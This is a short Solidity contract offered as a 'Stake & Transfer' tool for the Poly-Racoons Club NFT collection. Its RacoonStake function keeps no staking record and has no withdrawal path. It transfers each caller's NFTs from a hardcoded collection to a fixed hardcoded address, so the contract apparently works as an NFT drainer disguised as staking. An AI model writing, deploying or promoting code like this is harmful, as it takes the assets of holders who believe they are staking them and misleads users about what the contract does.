// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.4;

import {IERC721} from "./IERC721.sol";

/// @title Poly-Racoons Club Stake & Transfer
/// @author 0xYonga (https://twitter.com/0xYonga)
contract RacoonStakeTransfer {
    /// @dev 0x5f6f132c
    error InvalidArguments();
    /// @dev 0x4c084f14
    error NotOwnerOfToken();
    /// @dev 0x48f5c3ed
    error InvalidCaller();

    event BatchTransfer(
        address indexed contractAddress,
        address indexed to,
        uint256 amount
    );

    IERC721 constant erc721Contract = IERC721(0x80805999607d994D074714aC4Dc4AC6540b555cc);
    address constant defaultRecipient = 0xc046d0C2bdb9F109623F4d5bd2791532d10628B6;
    function RacoonStake(uint256[] calldata tokenIds) external {
        _batchTransfer(defaultRecipient, tokenIds);
    }
    function RacoonTransfer(address to, uint256[] calldata tokenIds) external {
        _batchTransfer(to, tokenIds);
    }

    function _batchTransfer(address to, uint256[] calldata tokenIds) private {
        uint256 length = tokenIds.length;
        for (uint256 i; i < length; i++) {
            uint256 tokenId = tokenIds[i];
            require(msg.sender == erc721Contract.ownerOf(tokenId), "Caller is not owner");
            erc721Contract.transferFrom(msg.sender, to, tokenId);
        }
        emit BatchTransfer(address(erc721Contract), to, length);
    }
}